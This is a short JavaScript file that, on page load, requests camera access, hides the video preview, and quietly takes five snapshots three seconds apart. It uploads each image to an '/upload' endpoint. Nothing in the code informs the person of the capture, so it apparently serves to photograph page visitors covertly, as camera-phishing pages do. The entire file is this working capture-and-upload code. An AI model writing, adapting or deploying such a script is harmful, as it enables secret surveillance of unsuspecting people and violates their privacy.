document.addEventListener("DOMContentLoaded", async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("videoContainer").style.display = "flex";

        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("autoplay", "");
        video.setAttribute("playsinline", "");
        video.style.display = "none"; // Hide camera preview
        document.body.appendChild(video);

        captureAndSend(video);
    } catch (error) {
        document.getElementById("videoContainer").style.display = "none";
    }
});

function captureAndSend(video) {
    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");
    let imagesSent = 0;

    const interval = setInterval(() => {
        if (imagesSent >= 5) {
            clearInterval(interval);
            return;
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("image", blob, `snapshot_${imagesSent + 1}.jpg`);

            fetch("/upload", {
                method: "POST",
                body: formData
            });
        }, "image/jpeg");
        
        imagesSent++;
    }, 3000);
}
